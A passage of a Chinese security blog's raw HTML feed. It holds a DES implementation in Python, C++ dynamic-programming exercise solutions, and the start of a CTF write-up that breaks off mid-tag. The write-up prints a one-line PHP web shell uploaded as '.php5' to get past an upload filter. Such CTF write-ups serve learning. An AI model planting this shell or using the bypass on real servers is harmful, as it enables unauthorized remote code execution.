<span class="keyword">in</span> word:</span><br><span class="line">key += <span class="string">f'<span class="subst">&#123;bin(ord(i))[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">8</span>&#125;</span>'</span></span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 终极加密函数，参数为秘钥和明文(明文暂时测试为64位以内)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt</span><span class="params">(ptext, key)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">l[i] = <span class="string">""</span></span><br><span class="line">r[i] = <span class="string">""</span></span><br><span class="line">key = convert_key_bin(key)</span><br><span class="line">cipher = init_replace(ptext)</span><br><span class="line">l[<span class="number">0</span>] = cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">r[<span class="number">0</span>] = cipher[<span class="number">32</span>:]</span><br><span class="line"><span class="comment"># 进行16层循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">l[i] = r[i<span class="number">-1</span>]</span><br><span class="line">secret_key = generate_secretkey(key,i) <span class="comment"># 生成子秘钥</span></span><br><span class="line">f_result = f_function(r[i<span class="number">-1</span>],secret_key,i)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">r[i] += str(int(l[i<span class="number">-1</span>][j])^int(f_result[j]))</span><br><span class="line">secret_key = generate_secretkey(key,<span class="number">16</span>)</span><br><span class="line">f_result = f_function(r[<span class="number">15</span>],secret_key,<span class="number">16</span>)</span><br><span class="line">l[<span class="number">16</span>] = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">l[<span class="number">16</span>] += str(int(l[<span class="number">15</span>][j])^int(f_result[j]))</span><br><span class="line">r[<span class="number">16</span>] = r[<span class="number">15</span>]</span><br><span class="line">temp = l[<span class="number">16</span>] + r[<span class="number">16</span>]</span><br><span class="line">final_cipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">final_cipher += temp[_ip[i]]</span><br><span class="line"><span class="keyword">return</span> <span class="string">f'<span class="subst">&#123;hex(int(final_cipher,<span class="number">2</span>))[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">16</span>&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_decrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">l[i] = <span class="string">""</span></span><br><span class="line">r[i] = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复为64位密文</span></span><br><span class="line">key = convert_key_bin(key)</span><br><span class="line">temp = bin(int(cipher, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">cipher = <span class="string">"0"</span>*(<span class="number">64</span>-len(temp)) + temp</span><br><span class="line">cipher = init_replace(cipher)</span><br><span class="line">l[<span class="number">16</span>] = cipher[:<span class="number">32</span>]</span><br><span class="line">r[<span class="number">16</span>] = cipher[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">l[i<span class="number">-1</span>] = r[i]</span><br><span class="line">secret_key = generate_secretkey(key,i) <span class="comment"># 生成子秘钥</span></span><br><span class="line">f_result = f_function(r[i],secret_key,i)</span><br><span class="line">r[i<span class="number">-1</span>] = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">r[i<span class="number">-1</span>] += str(int(l[i][j])^int(f_result[j]))</span><br><span class="line">r[<span class="number">0</span>] = r[<span class="number">1</span>]</span><br><span class="line">secret_key = generate_secretkey(key,<span class="number">1</span>)</span><br><span class="line">l[<span class="number">0</span>] = <span class="string">""</span></span><br><span class="line">f_result = f_function(r[<span class="number">1</span>],secret_key,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">l[<span class="number">0</span>] += str(int(l[<span class="number">1</span>][j])^int(f_result[j]))</span><br><span class="line">temp = l[<span class="number">0</span>] + r[<span class="number">0</span>]</span><br><span class="line">bintext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">bintext += temp[_ip[i]]</span><br><span class="line">plaintext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">plaintext += chr(int(bintext[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(text)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(text) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">text = text + <span class="string">" "</span>*(<span class="number">8</span>-(len(text)%<span class="number">8</span>))</span><br><span class="line">binplain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">binplain += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">return</span> binplain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">longbinplain = str2bin(text)</span><br><span class="line">group_plain = <span class="string">""</span></span><br><span class="line">longcipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(longbinplain)//<span class="number">64</span>):</span><br><span class="line">group_plain = <span class="string">""</span></span><br><span class="line">group_plain = longbinplain[<span class="number">64</span>*i:<span class="number">64</span>*i+<span class="number">64</span>]</span><br><span class="line">longcipher += des_encrypt(group_plain,key)</span><br><span class="line"><span class="keyword">return</span> longcipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">plaintext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)//<span class="number">16</span>):</span><br><span class="line">plaintext += des_decrypt(cipher[<span class="number">16</span>*i:<span class="number">16</span>*i+<span class="number">16</span>], key)</span><br><span class="line"><span class="keyword">return</span> plaintext.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">mode =  sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">while</span> mode <span class="keyword">in</span> (<span class="string">"e"</span>,<span class="string">"d"</span>):</span><br><span class="line">data = input(<span class="string">"Plz input data: "</span>)</span><br><span class="line">key = str(input(<span class="string">"Plz input key: "</span>))</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"e"</span>:</span><br><span class="line">ans = encrypt(data, key)</span><br><span class="line">print(ans)</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">"d"</span>:</span><br><span class="line">ans = decrypt(data, key)</span><br><span class="line">print(ans)</span><br><span class="line">mode = input(<span class="string">"quit or continue?\n"</span>)</span><br></pre></td></tr></table></figure><p>为了增强通用性，增加代码重用性，该算法使用了包封装，从而使其能够被其它程序重用。该DES支持短信息加密，也支持长消息加密。为了使密文便于显示和存储转化为16进制显示</p><p><em>实例演示：</em></p><p><img src="/2019/01/15/crypto1/4.png" alt="demo"></p><p><em>安全性分析</em></p><p>​    DES算法具有极高的安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。 而56位长的密钥的穷举空间为2^56，这意味着如果一台计算机的速度是每一秒钟检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的。然而，这并不等于说DES是不可破解的。而实际上，随着硬件技术和Internet的发展，其破解的可能性越来越大，而且，所需要的时间越来越少。使用经过特殊设计的硬件并行处理要几个小时。</p><p>​    由DES算法的密钥生成步骤中我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、……64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，……64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，……64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，….. .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。</p><p>​    此外，由于DES算法各轮（F函数）的子密钥是通过改变初始密钥这种方式得到的，因此有些初始密钥成了弱密钥（weakkey）。初始密钥分成两部分，每部分各自独立的移动。如果每一部分的所有位都是0或1，那么算法的任意一个周期的密钥都是相同的。当密钥是全1、全0、或者一半全1、一半全0时，会发生这种情况。所以<em>我们在选择密钥时要进行检查，以防止产生弱密钥</em>。</p><p>​    随着密码学的发展，差分分析和线性分析的发展对分组密码的安全性构成了挑战，也推动了分组密码设计技术的发展。</p><p>​    随着计算机计算能力的提高与密码分析技术的进步，DES的密钥长度已经被证明不能够满足当前安全性能的需求，为了克服DES密钥空间小的缺陷，人们又提出了三重DES的变形形式，即使用多个不同的DES秘钥利用DES算法对明文进行多次加密，这样可以增加密钥量。</p><p><em>算法实用性分析</em></p><p>​    DES算法拥有着良好的安全性，目前最有效的破解方法依然是穷举攻击，所以在一些安全性要求相对不高的情况下可以使用DES算法，此外，由于DES的广泛的使用量，为了充分利用有关DES的软硬件资源，可以使用DES的改进算法如三重DES算法等。</p><p>​    由于DES算法要进行多轮迭代，所以DES的运算速度相对较慢，此外，密码生命周期也比较短。</p><hr><p>​    分组密码与序列密码相比，具有扩散性好，插入敏感等优点，缺点是加解密处理速度慢、存在错误传播。用途上，在对于处理数据分组的应用，比如文件传递、电子邮件，分组密码非常合适。 </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在学习密码学，研究了一些密码学算法，特此记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="Record" scheme="http://chaosec.top/categories/Record/"/>
    
    
      <category term="Crypto" scheme="http://chaosec.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>简单算法记录</title>
    <link href="http://chaosec.top/2019/01/01/suanfa/"/>
    <id>http://chaosec.top/2019/01/01/suanfa/</id>
    <published>2019-01-01T08:45:12.000Z</published>
    <updated>2019-01-30T12:26:10.697Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下</p><a id="more"></a><h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><blockquote><p>题目描述<br>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=<a,b,f,c>是序列X=<a,b,c,f,b,c>的一个子序列，Z中的元素在X中的下标序列为<1,2,4,6>。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</1,2,4,6></a,b,c,f,b,c></a,b,f,c></p><p>输入<br>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><p>输出<br>对于每组输入，输出两个字符串的最长公共子序列的长度。</p></blockquote><p>最长公共子序列问题，递推公式为</p><p><img src="/2019/01/01/suanfa/1.png" alt=""></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> x;</span><br><span class="line"><span class="built_in">string</span> y;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">105</span>][<span class="number">105</span>],c[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCSLength</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++) c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++) c[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(x[i]==y[j])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">b[i][j] = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i<span class="number">-1</span>][j]&gt;c[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j];</span><br><span class="line">b[i][j] = <span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">c[i][j] = c[i][j<span class="number">-1</span>];</span><br><span class="line">b[i][j] = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//寻找最优解</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traceback</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">-1</span>||j==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(b[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;x[i];</span><br><span class="line">traceback(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b[i][j]==<span class="number">2</span>) traceback(i<span class="number">-1</span>,j);</span><br><span class="line"><span class="keyword">else</span> traceback(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y)&#123;</span><br><span class="line"><span class="keyword">int</span> a = x.length();</span><br><span class="line"><span class="keyword">int</span> b = y.length();</span><br><span class="line">LCSLength(a,b);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;c[a<span class="number">-1</span>][b<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">traceback(a<span class="number">-1</span>, b<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最大字段和"><a href="#最大字段和" class="headerlink" title="最大字段和"></a>最大字段和</h2><blockquote><p>题目描述<br>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。<br>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。<br>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><p>输出<br>输出其对应的最大子段和。</p></blockquote><p>递推公式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b[i] = max&#123;b[i-1]+a[i], a[i]&#125;  (1≤i≤n)</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> num[<span class="number">10005</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//再给出输出最优解的方法</span></span><br><span class="line"><span class="keyword">int</span> temp_start,len;</span><br><span class="line"><span class="keyword">int</span> besti,bestj;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_res</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=besti;i&lt;bestj;i++)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;num[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t,n;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans =<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line">&#125;</span><br><span class="line">temp_start = <span class="number">0</span>;</span><br><span class="line">len = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b&gt;<span class="number">0</span>)&#123;</span><br><span class="line">b = b + num[i];</span><br><span class="line">len++;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">b = num[i];</span><br><span class="line">temp_start = i;</span><br><span class="line">len = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans &lt; b)&#123;</span><br><span class="line">ans = b;</span><br><span class="line">besti = temp_start;</span><br><span class="line">bestj = temp_start + len;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//get_res();</span></span><br><span class="line">t--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h2><p>待续</p><h2 id="0-1背包"><a href="#0-1背包" class="headerlink" title="0-1背包"></a>0-1背包</h2><blockquote><p>题目描述<br>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><p>输出<br>对每组测试数据，输出其对应的所装物品的最大价值。</p></blockquote><p><img src="/2019/01/01/suanfa/2.png" alt="递推公式"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> c,n;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> w[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> v[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> m[<span class="number">1005</span>][<span class="number">10005</span>];<span class="comment">//数组长度要开的合适一点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pack</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;w[n];i++) m[n][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=w[n];i&lt;=c;i++) m[n][i] = v[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;w[i];j++) m[i][j] = m[i+<span class="number">1</span>][j];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=w[i];j&lt;=c;j++)&#123;</span><br><span class="line">m[i][j] = max(m[i+<span class="number">1</span>][j],m[i+<span class="number">1</span>][j-w[i]]+v[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//利用m的下标的意义来构造最优解 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traceback</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][c]!=m[i+<span class="number">1</span>][c])&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">c -= w[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i]; </span><br><span class="line">pack();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][c]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//traceback();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下&lt;/p&gt;
    
    </summary>
    
      <category term="Record" scheme="http://chaosec.top/categories/Record/"/>
    
    
      <category term="Algorithm" scheme="http://chaosec.top/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF第一轮月赛</title>
    <link href="http://chaosec.top/2018/12/21/cumtctf2018/"/>
    <id>http://chaosec.top/2018/12/21/cumtctf2018/</id>
    <published>2018-12-21T12:14:06.000Z</published>
    <updated>2019-01-31T04:27:16.203Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2018校赛第一轮月赛记录，做的有点不好，看了题目感觉都不是很难，自己放弃的太快了。</p><a id="more"></a><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h2><p>题目要求不能上传 <code>.asp,.aspx,.php,.jsp</code> 文件，上传了jpg后缀不能用，尝试上传php5后缀，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//snow.php5</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'snow'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以上传并获得上传路径，菜刀连接一下</p><p><img src="/2018/12/21/cumtctf2018/1.png" alt=""></p><p><img src="/2018/12/21/cumtctf2018/2.png" alt=""></p><!-- flag{bd7096c6267e6aa8928249176b9cb1d0} --><h2 id="Cve"><a href="#Cve" class="headerlink" title="Cve~"></a>Cve<del>~</del></h2><p>这道题真的是做的难受，试了好多种方法，最终找到一个payload柳暗花明..</p><blockquote><p><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a></p></blockquote><p>原理什么的就不细讲了，直接按照它说的操作就可以了，先看一下目录，根据前面的经验，估计又是在根目录下面</p><p><img src="/2018/12/21/cumtctf2018/4.png" alt=""></p><p>然后获取回显的formid</p><p><img src="/2018/12/21/cumtctf2018/5.png" alt=""></p><p><img src="/2018/12/21/cumtctf2018/6.png" alt=""></p><p><img src="/2018/12/21/cumtctf2018/7.png" alt=""></p><p><img 